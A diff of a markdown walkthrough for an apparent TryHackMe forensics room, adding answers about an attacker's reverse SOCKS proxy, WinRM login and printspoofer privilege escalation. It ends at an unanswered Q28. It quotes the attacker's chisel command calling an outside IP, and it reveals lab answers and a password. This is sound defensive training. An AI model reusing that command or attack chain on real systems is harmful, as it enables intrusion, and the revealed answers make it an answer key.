@@ -8,6 +8,9 @@ tags:
   - Digital Forensics
 languages:
   - eztools
+  - wireshark
+  - cyberchef
+  - virustotal
 image:
   url: https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg
   alt: tryhackme
@@ -254,7 +257,7 @@ Analyzing the header of any of these requests we will find the answer on the `us
 
 ### Q20: The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
 
-For this one I scrolled down untill I saw a requests that was different than the encoded ones, and then I stared to decode the last requests, if we do this we will find that the user had a file `automation.ps1` in the Desktop, that contained its password and he retrieved the information inside of it, so just use `CyberChef` and you will find the answer in one of the requests.
+For this one I scrolled down untill I saw a requests that was different than the encoded ones, and then I stared to decode the lasts requests, if we do this we will find that the user had a file `automation.ps1` in the Desktop, that contained its password and he retrieved the information inside of it, so just use `CyberChef` and you will find the answer in one of the requests.
 
 <details>
   <summary>Click to reveal the answer</summary>
@@ -262,3 +265,83 @@ For this one I scrolled down untill I saw a requests that was different than the
     infernotempest
   </div>
 </details>
+
+### Q21: The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
+
+Here we already have found the result of the enumeration that was encoded in one of the requests from checking different ones from previous question, there we will see all the ports open, so one thing we can do is search each port and try to see if its possible to setup a remote shell from one of these, at some point we will find the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    5985
+  </div>
+</details>
+
+### Q22: The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
+
+Analyzing the following commands we will see that later a executable is downloaded, and then executed using a powershell command. For this one we have to come back to the sysmon logs and find the command realted to the executable downloaded, there we will find the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
+  </div>
+</details>
+
+### Q23: What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
+
+In the same event log we can find the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
+  </div>
+</details>
+
+### Q24: What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
+
+Here we need to use a tool to analyze this previous hash, I will use `VirusTotal`. There we will find the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    chisel
+  </div>
+</details>
+
+### Q25: The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate? 
+
+In the sysmon logs we have to locate when does the socks command was executed I look for the next process creation, once we have it we have to find the name of the service of the executable.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    winrm
+  </div>
+</details>
+
+### Q26: After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
+
+Still in the same search as before we can continue looking at the sysmon logs, and we will find another executable, searching for its name we will find the SHA256 hash of the file.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
+  </div>
+</details>
+
+### Q27: Based on the SHA256 hash of the binary, what is the name of the tool used?
+
+Same as before, we can use `VirusTotal` to seach the SHA256, and the we will find the name of the tool.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    printspoofer
+  </div>
+</details>
+
+### Q28: The tool exploits a specific privilege owned by the user. What is the name of the privilege?
+
